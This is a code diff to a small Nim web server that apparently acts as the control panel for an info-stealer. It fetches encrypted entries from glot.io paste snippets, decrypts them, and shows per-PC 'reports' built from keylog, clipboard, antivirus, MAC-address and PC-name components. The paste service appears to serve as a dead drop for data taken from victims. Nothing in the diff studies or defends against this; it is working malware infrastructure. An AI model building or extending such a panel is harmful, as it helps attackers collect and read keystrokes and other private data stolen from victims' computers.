@@ -1,5 +1,10 @@
 import jester
+import httpclient
+import json
+
 from random import randomize
+
+from strutils import parseInt
 
 import lib/components/index as index
 import lib/components/clipboard as clipboard
@@ -9,12 +14,13 @@ import lib/components/infoCard as infoCard
 import lib/components/av as av
 import lib/components/keylog as keylog
 import lib/components/devicemac as devicemac
+import lib/components/displayPcs as displayPcs
 
 randomize()
 
-proc buildPage(): string =
+proc buildPage(id: string): string =
   result = index.render(
-    pcname.render("Report #a12bcd34 - DESKTOP-12345") &
+    pcname.render("Report #" & id & " - DESKTOP-12345") &
     #header.render("basic info") &
     infoCard.render(
       "Report Identification", [
@@ -35,6 +41,42 @@ proc buildPage(): string =
     devicemac.render("AA:BB:CC:DD:EE:FF") # aici pt manufacturer folosesti aia oui
   )
 
+proc getData(url: string): string =
+  let client: HttpClient = newHttpClient()
+
+  client.headers = newHttpHeaders({"Content-Type": "application/json"})
+
+  let response = client.request(
+    url,
+    httpMethod = HttpGet
+  )
+
+  result = response.body
+
+proc getSnippet(id: string): string =
+  result = getData "https://snippets.glot.io/snippets/" & id
+
+from lib/functions/parse import parseThreads
+from lib/functions/parse import decryptData
+
+proc getHeader(id: string): string =
+  try:
+    var data: string = decryptData parseJson(getSnippet id)["files"].getElems()[
+        0]["content"].getStr
+
+    result = parseThreads(id, data)
+  except:
+    result = ""
+
+proc getSnippets(page: string): string =
+  result = getData "https://snippets.glot.io/snippets?page=" & page & "&per_page=10"
+
 routes:
   get "/":
-    resp buildPage()
+    resp displayPcs.render()
+  get "/show/@id":
+    resp buildPage @"id"
+  get "/getHeader/@id":
+    resp getHeader @"id"
+  get "/getPage/@page":
+    resp getSnippets @"page"
